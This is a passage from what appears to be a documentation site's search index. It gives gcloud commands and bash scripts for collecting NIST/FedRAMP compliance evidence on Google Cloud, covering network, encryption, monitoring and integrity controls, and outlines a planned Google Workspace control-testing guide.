days\n\nTHRESHOLD_DAYS=90\nTHRESHOLD_DATE=$(date -d \"$THRESHOLD_DAYS days ago\" +%Y-%m-%d)\n\nfor sa in $(gcloud iam service-accounts list --format=\"value(email)\"); do\n  old_keys=$(gcloud iam service-accounts keys list \\\n    --iam-account=$sa \\\n    --filter=\"validAfterTime.date('%Y-%m-%d', Z)&lt;$THRESHOLD_DATE AND keyType=USER_MANAGED\" \\\n    --format=\"value(name)\")\n  \n  if [ ! -z \"$old_keys\" ]; then\n    echo \"Service Account $sa has keys older than $THRESHOLD_DAYS days:\"\n    echo \"$old_keys\"\n  fi\ndone\n</code></pre>"},{"location":"nist-fedramp/gcp/identification-authentication/#additional-resources","title":"Additional Resources","text":"<ul> <li>Google Cloud Identity Documentation</li> <li>Cloud IAM Documentation</li> <li>OS Login Documentation</li> </ul>"},{"location":"nist-fedramp/gcp/system-communications-protection/","title":"System and Communications Protection (SC) - Google Cloud Platform","text":""},{"location":"nist-fedramp/gcp/system-communications-protection/#overview","title":"Overview","text":"<p>This guide provides gcloud commands and automated methods for collecting evidence related to NIST SP 800-53 and FedRAMP System and Communications Protection (SC) family controls in Google Cloud Platform environments.</p>"},{"location":"nist-fedramp/gcp/system-communications-protection/#key-gcp-services","title":"Key GCP Services","text":"<ul> <li>VPC Networks: Virtual Private Cloud networking</li> <li>Cloud Armor: DDoS protection and WAF</li> <li>Cloud Load Balancing: SSL/TLS termination</li> <li>Cloud VPN: Encrypted connections</li> <li>Cloud KMS: Encryption key management</li> <li>VPC Service Controls: API security perimeters</li> </ul>"},{"location":"nist-fedramp/gcp/system-communications-protection/#control-implementation-commands","title":"Control Implementation Commands","text":""},{"location":"nist-fedramp/gcp/system-communications-protection/#sc-7-boundary-protection","title":"SC-7: Boundary Protection","text":"<p>List all VPC networks <pre><code>gcloud compute networks list --project=PROJECT_ID\n</code></pre></p> <p>List all firewall rules <pre><code>gcloud compute firewall-rules list \\\n  --format=\"table(name,direction,priority,sourceRanges,allowed[].ports,targetTags)\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>Check for overly permissive firewall rules <pre><code>gcloud compute firewall-rules list \\\n  --filter=\"sourceRanges:('0.0.0.0/0')\" \\\n  --format=\"table(name,allowed[].ports,targetTags)\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>List Cloud Armor security policies <pre><code>gcloud compute security-policies list --project=PROJECT_ID\n</code></pre></p> <p>Check VPC peering connections <pre><code>gcloud compute networks peerings list --network=NETWORK_NAME --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-communications-protection/#sc-8-transmission-confidentiality-and-integrity","title":"SC-8: Transmission Confidentiality and Integrity","text":"<p>List SSL certificates <pre><code>gcloud compute ssl-certificates list --project=PROJECT_ID\n</code></pre></p> <p>Check HTTPS load balancers <pre><code>gcloud compute target-https-proxies list --project=PROJECT_ID\n</code></pre></p> <p>List VPN tunnels and gateways <pre><code>gcloud compute vpn-tunnels list --project=PROJECT_ID\ngcloud compute vpn-gateways list --project=PROJECT_ID\n</code></pre></p> <p>Check Cloud Interconnect attachments <pre><code>gcloud compute interconnects attachments list --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-communications-protection/#sc-12-cryptographic-key-establishment-and-management","title":"SC-12: Cryptographic Key Establishment and Management","text":"<p>List all Cloud KMS keys <pre><code>gcloud kms keys list --location=global --keyring=KEYRING_NAME --project=PROJECT_ID\n</code></pre></p> <p>Check key rotation schedules <pre><code>gcloud kms keys describe KEY_NAME \\\n  --location=LOCATION \\\n  --keyring=KEYRING_NAME \\\n  --format=\"table(name,rotationPeriod,nextRotationTime)\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>List keys by protection level <pre><code>gcloud kms keys list \\\n  --location=global \\\n  --keyring=KEYRING_NAME \\\n  --filter=\"versionTemplate.protectionLevel=HSM\" \\\n  --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-communications-protection/#sc-13-cryptographic-protection","title":"SC-13: Cryptographic Protection","text":"<p>Check Cloud Storage bucket encryption <pre><code>for bucket in $(gsutil ls); do\n  echo \"Bucket: $bucket\"\n  gsutil encryption get $bucket\ndone\n</code></pre></p> <p>List disks and their encryption status <pre><code>gcloud compute disks list \\\n  --format=\"table(name,zone,diskEncryptionKey.kmsKeyName:label=KMS_KEY)\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>Check default encryption settings for project <pre><code>gcloud compute project-info describe \\\n  --format=\"value(defaultServiceAccount,commonInstanceMetadata.items[key='google-compute-default-encrypt'])\" \\\n  --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-communications-protection/#sc-23-session-authenticity","title":"SC-23: Session Authenticity","text":"<p>Check load balancer session affinity <pre><code>gcloud compute backend-services list \\\n  --format=\"table(name,sessionAffinity,affinityCookieTtlSec)\" \\\n  --project=PROJECT_ID\n</code></pre></p> <p>List instances with secure boot enabled <pre><code>gcloud compute instances list \\\n  --filter=\"shieldedInstanceConfig.enableSecureBoot=true\" \\\n  --format=\"table(name,shieldedInstanceConfig.enableSecureBoot)\" \\\n  --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-communications-protection/#sc-28-protection-of-information-at-rest","title":"SC-28: Protection of Information at Rest","text":"<p>Check bucket lifecycle policies for data retention <pre><code>for bucket in $(gsutil ls); do\n  echo \"Bucket: $bucket\"\n  gsutil lifecycle get $bucket\ndone\n</code></pre></p> <p>List all customer-managed encryption keys (CMEK) usage <pre><code>gcloud asset search-all-resources \\\n  --scope=projects/PROJECT_ID \\\n  --query=\"kmsKey:*\" \\\n  --format=\"table(name,assetType,kmsKey)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-communications-protection/#automated-evidence-collection-scripts","title":"Automated Evidence Collection Scripts","text":""},{"location":"nist-fedramp/gcp/system-communications-protection/#network-security-audit","title":"Network Security Audit","text":"<pre><code>#!/bin/bash\n# Comprehensive network security audit\n\nPROJECT_ID=\"YOUR_PROJECT_ID\"\nOUTPUT_DIR=\"sc_audit_$(date +%Y%m%d)\"\nmkdir -p $OUTPUT_DIR\n\n# Firewall rules audit\necho \"=== Firewall Rules Audit ===\"\ngcloud compute firewall-rules list --format=json &gt; $OUTPUT_DIR/firewall_rules.json\n\n# Find risky firewall rules\necho \"=== Risky Firewall Rules ===\"\ngcloud compute firewall-rules list \\\n  --filter=\"sourceRanges:('0.0.0.0/0') AND allowed.ports:('22' OR '3389' OR '23')\" \\\n  --format=json &gt; $OUTPUT_DIR/risky_firewall_rules.json\n\n# VPC configuration\necho \"=== VPC Networks ===\"\ngcloud compute networks list --format=json &gt; $OUTPUT_DIR/vpc_networks.json\n\n# SSL certificates\necho \"=== SSL Certificates ===\"\ngcloud compute ssl-certificates list --format=json &gt; $OUTPUT_DIR/ssl_certificates.json\n\n# VPN configuration\necho \"=== VPN Configuration ===\"\ngcloud compute vpn-tunnels list --format=json &gt; $OUTPUT_DIR/vpn_tunnels.json\ngcloud compute vpn-gateways list --format=json &gt; $OUTPUT_DIR/vpn_gateways.json\n\n# Cloud Armor policies\necho \"=== Cloud Armor Policies ===\"\ngcloud compute security-policies list --format=json &gt; $OUTPUT_DIR/cloud_armor_policies.json\n</code></pre>"},{"location":"nist-fedramp/gcp/system-communications-protection/#encryption-audit","title":"Encryption Audit","text":"<pre><code>#!/bin/bash\n# Audit encryption across all resources\n\nPROJECT_ID=\"YOUR_PROJECT_ID\"\nOUTPUT_DIR=\"encryption_audit_$(date +%Y%m%d)\"\nmkdir -p $OUTPUT_DIR\n\n# KMS keys inventory\necho \"=== KMS Keys ===\"\nfor keyring in $(gcloud kms keyrings list --location=global --format=\"value(name)\"); do\n  gcloud kms keys list --keyring=$keyring --location=global --format=json &gt;&gt; $OUTPUT_DIR/kms_keys.json\ndone\n\n# Disk encryption audit\necho \"=== Disk Encryption ===\"\ngcloud compute disks list \\\n  --format=\"json(name,zone,diskEncryptionKey,sourceImageEncryptionKey)\" &gt; $OUTPUT_DIR/disk_encryption.json\n\n# Check for unencrypted disks\necho \"=== Unencrypted Disks ===\"\ngcloud compute disks list \\\n  --filter=\"diskEncryptionKey.kmsKeyName:NULL\" \\\n  --format=\"table(name,zone)\" &gt; $OUTPUT_DIR/unencrypted_disks.txt\n\n# Storage bucket encryption\necho \"=== Storage Bucket Encryption ===\"\nfor bucket in $(gsutil ls); do\n  echo \"Bucket: $bucket\" &gt;&gt; $OUTPUT_DIR/bucket_encryption.txt\n  gsutil encryption get $bucket &gt;&gt; $OUTPUT_DIR/bucket_encryption.txt\n  echo \"---\" &gt;&gt; $OUTPUT_DIR/bucket_encryption.txt\ndone\n</code></pre>"},{"location":"nist-fedramp/gcp/system-communications-protection/#monitor-network-security-events","title":"Monitor Network Security Events","text":"<pre><code>#!/bin/bash\n# Monitor security-related network events\n\n# Monitor firewall denials\ngcloud logging read \\\n  \"resource.type=\\\"gce_subnetwork\\\" AND jsonPayload.rule_details.action=\\\"deny\\\"\" \\\n  --project=PROJECT_ID \\\n  --format=\"table(timestamp,jsonPayload.rule_details.reference,jsonPayload.connection.src_ip,jsonPayload.connection.dest_ip)\" \\\n  --freshness=24h\n\n# Monitor VPN connection issues\ngcloud logging read \\\n  \"resource.type=\\\"vpn_gateway\\\" AND severity&gt;=WARNING\" \\\n  --project=PROJECT_ID \\\n  --format=\"table(timestamp,textPayload)\" \\\n  --freshness=24h\n\n# Monitor SSL certificate expiration\nfor cert in $(gcloud compute ssl-certificates list --format=\"value(name)\"); do\n  expiry=$(gcloud compute ssl-certificates describe $cert --format=\"value(expireTime)\")\n  echo \"Certificate: $cert expires on $expiry\"\ndone\n</code></pre>"},{"location":"nist-fedramp/gcp/system-communications-protection/#vpc-service-controls-audit","title":"VPC Service Controls Audit","text":"<pre><code>#!/bin/bash\n# Audit VPC Service Controls configuration\n\n# List all access policies\ngcloud access-context-manager policies list\n\n# List service perimeters\ngcloud access-context-manager perimeters list \\\n  --policy=POLICY_ID \\\n  --format=\"table(name,title,perimeterType,status.resources)\"\n\n# Check for dry-run perimeters\ngcloud access-context-manager perimeters list \\\n  --policy=POLICY_ID \\\n  --filter=\"perimeterType=PERIMETER_TYPE_DRY_RUN\"\n\n# List access levels\ngcloud access-context-manager levels list \\\n  --policy=POLICY_ID \\\n  --format=\"table(name,title,basic.conditions.ipSubnetworks)\"\n</code></pre>"},{"location":"nist-fedramp/gcp/system-communications-protection/#additional-resources","title":"Additional Resources","text":"<ul> <li>VPC Documentation</li> <li>Cloud Armor Documentation</li> <li>Cloud KMS Documentation</li> <li>VPC Service Controls</li> </ul>"},{"location":"nist-fedramp/gcp/system-information-integrity/","title":"System and Information Integrity (SI) - Google Cloud Platform","text":""},{"location":"nist-fedramp/gcp/system-information-integrity/#overview","title":"Overview","text":"<p>This guide provides gcloud commands and automated methods for collecting evidence related to NIST SP 800-53 and FedRAMP System and Information Integrity (SI) family controls in Google Cloud Platform environments.</p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#key-gcp-services","title":"Key GCP Services","text":"<ul> <li>Security Command Center: Vulnerability and threat detection</li> <li>Cloud Logging: Centralized logging and monitoring</li> <li>Cloud Monitoring: Performance and uptime monitoring</li> <li>Cloud Security Scanner: Web application vulnerability scanning</li> <li>Container Analysis: Container vulnerability scanning</li> <li>Cloud IDS: Intrusion detection system</li> </ul>"},{"location":"nist-fedramp/gcp/system-information-integrity/#control-implementation-commands","title":"Control Implementation Commands","text":""},{"location":"nist-fedramp/gcp/system-information-integrity/#si-2-flaw-remediation","title":"SI-2: Flaw Remediation","text":"<p>List Security Command Center findings <pre><code>gcloud scc findings list organizations/ORGANIZATION_ID \\\n  --source=organizations/ORGANIZATION_ID/sources/SECURITY_HEALTH_ANALYTICS_SOURCE_ID \\\n  --filter=\"state=\\\"ACTIVE\\\" AND category=\\\"VULNERABILITY\\\"\" \\\n  --format=\"table(name,category,findingClass,severity)\"\n</code></pre></p> <p>Check OS patch status on instances <pre><code>gcloud compute instances os-inventory list-instances \\\n  --format=\"table(name,lastOsInventoryUpdateTime)\"\n</code></pre></p> <p>Get OS inventory details for an instance <pre><code>gcloud compute instances os-inventory describe INSTANCE_NAME \\\n  --zone=ZONE\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-3-malware-protection","title":"SI-3: Malware Protection","text":"<p>Check Shielded VM status (includes vTPM for integrity) <pre><code>gcloud compute instances list \\\n  --filter=\"shieldedInstanceConfig.enableIntegrityMonitoring=true\" \\\n  --format=\"table(name,shieldedInstanceConfig.enableIntegrityMonitoring,shieldedInstanceConfig.enableVtpm)\"\n</code></pre></p> <p>Monitor malware detection alerts <pre><code>gcloud logging read \\\n  \"resource.type=\\\"gce_instance\\\" AND protoPayload.response.finding.category=\\\"MALWARE\\\"\" \\\n  --project=PROJECT_ID \\\n  --freshness=7d\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-4-information-system-monitoring","title":"SI-4: Information System Monitoring","text":"<p>List all log sinks <pre><code>gcloud logging sinks list --project=PROJECT_ID\n</code></pre></p> <p>Check Cloud Monitoring alerting policies <pre><code>gcloud monitoring policies list --project=PROJECT_ID\n</code></pre></p> <p>List notification channels <pre><code>gcloud monitoring channels list --project=PROJECT_ID\n</code></pre></p> <p>Export audit logs for analysis <pre><code>gcloud logging read \\\n  \"logName=\\\"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity\\\"\" \\\n  --project=PROJECT_ID \\\n  --format=json \\\n  --freshness=24h &gt; audit_logs.json\n</code></pre></p> <p>Check if Cloud IDS is enabled <pre><code>gcloud ids endpoints list --project=PROJECT_ID --location=LOCATION\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-5-security-alerts-advisories-and-directives","title":"SI-5: Security Alerts, Advisories, and Directives","text":"<p>List Security Command Center notification configs <pre><code>gcloud scc notification-configs list --organization=ORGANIZATION_ID\n</code></pre></p> <p>Check for critical findings <pre><code>gcloud scc findings list organizations/ORGANIZATION_ID \\\n  --filter=\"severity=\\\"CRITICAL\\\" OR severity=\\\"HIGH\\\"\" \\\n  --format=\"table(name,category,severity,state,createTime)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-6-security-function-verification","title":"SI-6: Security Function Verification","text":"<p>Verify security controls are active <pre><code># Check if audit logging is enabled\ngcloud projects get-iam-policy PROJECT_ID \\\n  --flatten=\"auditConfigs[].auditLogConfigs[]\" \\\n  --format=\"table(auditConfigs.service,auditConfigs.auditLogConfigs.logType)\"\n\n# Check organization policies are enforced\ngcloud resource-manager org-policies list \\\n  --organization=ORGANIZATION_ID \\\n  --format=\"table(constraint,listPolicy.allValues,booleanPolicy.enforced)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-7-software-firmware-and-information-integrity","title":"SI-7: Software, Firmware, and Information Integrity","text":"<p>Check image signatures and attestations <pre><code>gcloud container binauthz attestors list --project=PROJECT_ID\n</code></pre></p> <p>Verify Binary Authorization policy <pre><code>gcloud container binauthz policy export --project=PROJECT_ID\n</code></pre></p> <p>List signed container images <pre><code>gcloud container images list-tags gcr.io/PROJECT_ID/IMAGE_NAME \\\n  --format=\"table(digest,tags,timestamp)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-10-information-input-validation","title":"SI-10: Information Input Validation","text":"<p>Check Web Security Scanner findings <pre><code>gcloud web-security-scanner scan-runs list \\\n  --project=PROJECT_ID\n</code></pre></p> <p>Get scan results <pre><code>gcloud web-security-scanner findings list \\\n  --scan-run=SCAN_RUN_NAME \\\n  --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-12-information-handling-and-retention","title":"SI-12: Information Handling and Retention","text":"<p>Check Cloud Storage lifecycle policies <pre><code>for bucket in $(gsutil ls); do\n  echo \"Bucket: $bucket\"\n  gsutil lifecycle get $bucket\ndone\n</code></pre></p> <p>List retention policies on log buckets <pre><code>gcloud logging buckets list \\\n  --location=global \\\n  --format=\"table(name,retentionDays,locked)\" \\\n  --project=PROJECT_ID\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#si-16-memory-protection","title":"SI-16: Memory Protection","text":"<p>Check for instances with secure boot enabled <pre><code>gcloud compute instances list \\\n  --filter=\"shieldedInstanceConfig.enableSecureBoot=true\" \\\n  --format=\"table(name,shieldedInstanceConfig.enableSecureBoot,shieldedInstanceConfig.enableVtpm,shieldedInstanceConfig.enableIntegrityMonitoring)\"\n</code></pre></p>"},{"location":"nist-fedramp/gcp/system-information-integrity/#automated-evidence-collection-scripts","title":"Automated Evidence Collection Scripts","text":""},{"location":"nist-fedramp/gcp/system-information-integrity/#comprehensive-security-monitoring-audit","title":"Comprehensive Security Monitoring Audit","text":"<pre><code>#!/bin/bash\n# Complete SI controls audit\n\nPROJECT_ID=\"YOUR_PROJECT_ID\"\nORG_ID=\"YOUR_ORG_ID\"\nOUTPUT_DIR=\"si_audit_$(date +%Y%m%d)\"\nmkdir -p $OUTPUT_DIR\n\n# Security findings\necho \"=== Security Command Center Findings ===\"\ngcloud scc findings list organizations/$ORG_ID \\\n  --filter=\"state=\\\"ACTIVE\\\"\" \\\n  --format=json &gt; $OUTPUT_DIR/scc_findings.json\n\n# Logging configuration\necho \"=== Logging Configuration ===\"\ngcloud logging sinks list --format=json &gt; $OUTPUT_DIR/log_sinks.json\ngcloud logging buckets list --location=global --format=json &gt; $OUTPUT_DIR/log_buckets.json\n\n# Monitoring configuration\necho \"=== Monitoring Alerts ===\"\ngcloud monitoring policies list --format=json &gt; $OUTPUT_DIR/alert_policies.json\ngcloud monitoring channels list --format=json &gt; $OUTPUT_DIR/notification_channels.json\n\n# Shielded VM status\necho \"=== Shielded VM Status ===\"\ngcloud compute instances list \\\n  --format=\"json(name,shieldedInstanceConfig)\" &gt; $OUTPUT_DIR/shielded_vms.json\n\n# Binary Authorization\necho \"=== Binary Authorization ===\"\ngcloud container binauthz policy export &gt; $OUTPUT_DIR/binauthz_policy.yaml\ngcloud container binauthz attestors list --format=json &gt; $OUTPUT_DIR/attestors.json\n</code></pre>"},{"location":"nist-fedramp/gcp/system-information-integrity/#vulnerability-management-report","title":"Vulnerability Management Report","text":"<pre><code>#!/bin/bash\n# Generate vulnerability management report\n\n# OS vulnerabilities\necho \"=== OS Vulnerabilities ===\"\ngcloud scc findings list organizations/ORG_ID \\\n  --source=organizations/ORG_ID/sources/SECURITY_HEALTH_ANALYTICS_SOURCE_ID \\\n  --filter=\"category=\\\"OS_VULNERABILITY\\\" AND state=\\\"ACTIVE\\\"\" \\\n  --format=\"table(resource,category,findingClass,severity)\"\n\n# Container vulnerabilities\necho \"=== Container Vulnerabilities ===\"\nfor image in $(gcloud container images list --format=\"value(name)\"); do\n  echo \"Scanning image: $image\"\n  gcloud container images scan $image\n  gcloud container images describe $image --show-package-vulnerability\ndone\n\n# Web application vulnerabilities\necho \"=== Web Security Scanner Results ===\"\ngcloud web-security-scanner scan-runs list \\\n  --format=\"table(name,state,startTime,endTime,urlsCrawledCount,urlsTestedCount)\"\n</code></pre>"},{"location":"nist-fedramp/gcp/system-information-integrity/#real-time-security-monitoring","title":"Real-time Security Monitoring","text":"<pre><code>#!/bin/bash\n# Monitor security events in real-time\n\n# Monitor critical security findings\nwatch -n 300 'gcloud scc findings list organizations/ORG_ID \\\n  --filter=\"severity=\\\"CRITICAL\\\" AND state=\\\"ACTIVE\\\" AND eventTime&gt;timestamp.now()-300s\" \\\n  --format=\"table(name,category,severity,eventTime)\"'\n\n# Monitor authentication failures\ngcloud logging tail \\\n  \"protoPayload.status.code=7 OR protoPayload.status.code=16\" \\\n  --project=PROJECT_ID\n\n# Monitor configuration changes\ngcloud logging tail \\\n  \"protoPayload.methodName:(\\\"SetIamPolicy\\\" OR \\\"Update\\\" OR \\\"Patch\\\" OR \\\"Delete\\\")\" \\\n  --project=PROJECT_ID\n</code></pre>"},{"location":"nist-fedramp/gcp/system-information-integrity/#compliance-evidence-export","title":"Compliance Evidence Export","text":"<pre><code>#!/bin/bash\n# Export compliance evidence for SI controls\n\nEXPORT_BUCKET=\"gs://compliance-evidence-bucket\"\nTIMESTAMP=$(date +%Y%m%d_%H%M%S)\n\n# Export all security findings\ngcloud scc findings list organizations/ORG_ID \\\n  --filter=\"state=\\\"ACTIVE\\\"\" \\\n  --format=json | gsutil cp - $EXPORT_BUCKET/si_findings_$TIMESTAMP.json\n\n# Export monitoring configuration\ngcloud monitoring policies list --format=json | \\\n  gsutil cp - $EXPORT_BUCKET/monitoring_policies_$TIMESTAMP.json\n\n# Export log aggregation proof\ngcloud logging sinks list --format=json | \\\n  gsutil cp - $EXPORT_BUCKET/log_sinks_$TIMESTAMP.json\n\n# Export patch compliance status\nfor instance in $(gcloud compute instances list --format=\"value(name,zone)\"); do\n  name=$(echo $instance | cut -d' ' -f1)\n  zone=$(echo $instance | cut -d' ' -f2)\n  gcloud compute instances os-inventory describe $name --zone=$zone --format=json | \\\n    gsutil cp - $EXPORT_BUCKET/patch_status_${name}_$TIMESTAMP.json\ndone\n</code></pre>"},{"location":"nist-fedramp/gcp/system-information-integrity/#additional-resources","title":"Additional Resources","text":"<ul> <li>Security Command Center Documentation</li> <li>Cloud Logging Documentation</li> <li>Cloud Monitoring Documentation</li> <li>Container Analysis Documentation</li> </ul>"},{"location":"nist-fedramp/workspace/","title":"Google Workspace NIST/FedRAMP Controls Testing Guide","text":""},{"location":"nist-fedramp/workspace/#overview","title":"Overview","text":"<p>This section provides comprehensive testing guidance for NIST and FedRAMP security controls specifically tailored for Google Workspace environments. These guides help assessors, security teams, and administrators validate compliance and security implementations across Google Workspace services.</p>"},{"location":"nist-fedramp/workspace/#google-workspace-services-covered","title":"Google Workspace Services Covered","text":"<ul> <li>Gmail: Email security, data loss prevention, and communication controls</li> <li>Google Drive: Document security, sharing controls, and data protection</li> <li>Google Meet: Video conferencing security and privacy controls</li> <li>Google Calendar: Scheduling security and information sharing</li> <li>Google Admin Console: Administrative controls and policy management</li> <li>Google Vault: eDiscovery, retention, and legal hold capabilities</li> <li>Google Cloud Identity: Identity and access management</li> </ul>"},{"location":"nist-fedramp/workspace/#control-testing-guides","title":"Control Testing Guides","text":""},{"location":"nist-fedramp/workspace/#access-control-ac-coming-soon","title":"Access Control (AC) - Coming Soon","text":"<p>Comprehensive testing procedures for: - User access provisioning and deprovisioning - Role-based access control (RBAC) implementation - Organizational unit (OU) based policies - Guest and external user access controls - Mobile device access restrictions</p>"},{"location":"nist-fedramp/workspace/#identity-and-authentication-ia-coming-soon","title":"Identity and Authentication (IA) - Coming Soon","text":"<p>Testing methodologies for: - Multi-factor authentication (MFA) enforcement - Single Sign-On (SSO) configuration - Password policies and complexity requirements - Session management and timeout controls - Certificate-based authentication</p>"},{"location":"nist-fedramp/workspace/#data-protection-scmp-coming-soon","title":"Data Protection (SC/MP) - Coming Soon","text":"<p>Validation procedures for: - Data Loss Prevention (DLP) policies - Email encryption and S/MIME - Drive encryption and sharing restrictions - Information Rights Management (IRM) - Mobile device management (MDM)</p>"},{"location":"nist-fedramp/workspace/#audit-and-accountability-au-coming-soon","title":"Audit and Accountability (AU) - Coming Soon","text":"<p>Assessment guides for: - Admin audit logs configuration - User activity monitoring - Login and access reports - Alert policies and notifications - Log retention and export</p>"},{"location":"nist-fedramp/workspace/#configuration-management-cm-coming-soon","title":"Configuration Management (CM) - Coming Soon","text":"<p>Testing procedures for: - Security baselines and hardening - Change management processes - Group policies and settings - API access controls - Third-party app management</p>"},{"location":"nist-fedramp/workspace/#quick-reference","title":"Quick Reference","text":""},{"location":"nist-fedramp/workspace/#essential-admin-console-locations","title":"Essential Admin Console Locations","text":"Control Area Admin Console Path User Management Directory &gt; Users Security Settings Security &gt; Security Center Device Management Devices &gt; Mobile &amp; Endpoints Audit Logs Reports &gt; Audit Log DLP Rules Security &gt; Data Protection Authentication Security &gt; Authentication"},{"location":"nist-fedramp/workspace/#key-apis-for-automation","title":"Key APIs for Automation","text":"<pre><code># Example: List users with admin privileges\nfrom googleapiclient.discovery import build\nfrom google.oauth2 import service_account\n\n# Initialize the Admin SDK Directory API\nservice = build('admin', 'directory_v1', credentials=creds)\n\n# List all admin users\nresults = service.users().list(\n    customer='my_customer',\n    query='isAdmin=true',\n    orderBy='email'\n).execute()\n</code></pre>"},{"location":"nist-fedramp/workspace/#common-compliance-checks","title":"Common Compliance Checks","text":"<ol> <li> <p>MFA Enforcement Status <pre><code>Admin Console &gt; Security &gt; Authentication &gt; 2-Step Verification\n</code></pre></p> </li> <li> <p>Password Policy Compliance <pre><code>Admin Console &gt; Security &gt; Authentication &gt; Password Management\n</code></pre></p> </li> <li> <p>External Sharing Settings <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive &gt; Sharing Settings\n</code></pre></p> </li> <li> <p>Mobile Device Requirements <pre><code>Admin Console &gt; Devices &gt; Mobile &amp; Endpoints &gt; Settings\n</code></pre></p> </li> </ol>"},{"location":"nist-fedramp/workspace/#best-practices","title":"Best Practices","text":"<p>Preparation Checklist</p> <ul> <li> Obtain Super Admin access or appropriate delegated admin roles</li> <li> Review organizational structure and OU hierarchy</li> <li> Document current security policies and exceptions</li> <li> Enable comprehensive audit logging before testing</li> <li> Create test accounts for validation procedures</li> </ul> <p>Testing Considerations</p> <ul> <li>Always test in a controlled manner to avoid service disruption</li> <li>Be aware of propagation delays for policy changes (up to 24 hours)</li> <li>Consider the impact on end users when modifying settings</li> <li>Document all changes made during testing for rollback purposes</li> </ul>"},{"location":"nist-fedramp/workspace/#integration-with-gcp","title":"Integration with GCP","text":"<p>Many organizations use both Google Workspace and GCP. Key integration points for testing:</p> <ul> <li>Cloud Identity: Unified identity management</li> <li>Context-Aware Access: Combined access policies</li> <li>Security Command Center: Centralized security monitoring</li> <li>Cloud Logging: Aggregated audit logs</li> </ul>"},{"location":"nist-fedramp/workspace/#tools-and-resources","title":"Tools and Resources","text":""},{"location":"nist-fedramp/workspace/#google-provided-tools","title":"Google-Provided Tools","text":"<ul> <li>Security Health Check</li> <li>Admin SDK API Explorer</li> <li>GAM (Google Apps Manager)</li> </ul>"},{"location":"nist-fedramp/workspace/#third-party-assessment-tools","title":"Third-Party Assessment Tools","text":"<ul> <li>BeyondCorp Enterprise assessment tools</li> <li>Workspace security scanners</li> <li>Compliance automation platforms</li> </ul>"},{"location":"nist-fedramp/workspace/#roadmap","title":"Roadmap","text":"<ul> <li> Q2 2025: Access Control (AC) Testing Guide</li> <li> Q2 2025: Identity &amp; Authentication (IA) Testing Guide</li> <li> Q3 2025: Data Protection Testing Guide</li> <li> Q3 2025: Audit &amp; Accountability Testing Guide</li> <li> Q4 2025: Automated testing scripts and tools</li> </ul>"},{"location":"nist-fedramp/workspace/#getting-help","title":"Getting Help","text":"<p>For questions about Google Workspace security controls: - Google Workspace Admin Help - Google Workspace Security Center - Google Cloud Customer Care</p>"},{"location":"workspace/","title":"Google Workspace Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"workspace/#overview","title":"\ud83d\udee1\ufe0f Overview","text":"<p>This guide provides security professionals, MSPs, and IT administrators with detailed strategies for securing Google Workspace environments. It focuses on practical implementation of security controls, identity protection, threat detection, and incident response.</p> \ud83d\udd12 Practical Implementation <p>Step-by-step instructions for implementing security controls in Google Workspace</p> \ud83c\udfe2 MSP-Specific Guidance <p>Specialized recommendations for managed service providers supporting multiple clients</p> \ud83d\udd0d Threat Detection <p>Advanced techniques for identifying and responding to security threats</p>"},{"location":"workspace/#about-this-project","title":"\ud83d\udd0d About This Project","text":"<p>The Google Workspace Security section is designed to provide comprehensive security guidance for organizations of all sizes, with a special focus on the needs of Managed Service Providers (MSPs) and Small to Medium Businesses (SMBs).</p>"},{"location":"workspace/#key-features","title":"Key Features","text":"<ul> <li>Practical Implementation Guidance: Step-by-step instructions for implementing security controls</li> <li>MSP-Specific Considerations: Guidance tailored to multi-tenant management scenarios</li> <li>Threat Detection &amp; Response: Advanced techniques for identifying and responding to security incidents</li> <li>Security Templates: Ready-to-use checklists and implementation frameworks</li> <li>Technical Deep Dives: Detailed exploration of Google Workspace security features</li> </ul>"},{"location":"workspace/#target-audience","title":"Target Audience","text":"<p>This suite is primarily designed for:</p> <ul> <li>Security Professionals: Responsible for securing Google Workspace environments</li> <li>IT Administrators: Managing Google Workspace deployments</li> <li>Managed Service Providers: Supporting multiple client environments</li> <li>Security Consultants: Advising on cloud security implementations</li> <li>Compliance Officers: Ensuring regulatory compliance in cloud environments</li> </ul>"},{"location":"workspace/#getting-started","title":"Getting Started","text":"<p>This documentation is organized into two main sections:</p> <ol> <li>Core Security Components: Essential security controls that should be implemented in every Google Workspace environment</li> <li>Advanced Security Topics: Specialized security areas for enhanced protection</li> </ol> <p>Use the navigation menu to explore specific topics. Each section provides detailed guidance, implementation steps, and security best practices for Google Workspace environments.</p> <p>This guide is continually updated as Google Workspace security capabilities evolve.</p>"}]}